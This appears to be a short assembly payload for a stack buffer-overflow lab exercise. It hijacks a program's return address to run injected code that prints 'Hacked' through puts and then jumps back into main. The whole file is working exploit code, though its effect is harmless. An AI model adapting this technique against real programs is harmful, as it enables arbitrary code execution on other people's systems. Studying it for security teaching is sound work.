BITS 32
BUFFER_ADDRESS EQU 0xffffce1c ; The address of the buffer variable in memory
ORG BUFFER_ADDRESS
SECTION .text

MOV EAX, message
MOV BYTE [EAX+2], 0
PUSH EAX
CALL 0x08049050 ; buffer-overflow!puts@plt
MOV EBP, BUFFER_ADDRESS + 0x2c ; restore original EBP
JMP 0x0804923d ; buffer-overflow!main
message: db "Hacked",0xff
dd BUFFER_ADDRESS ; RETURN address
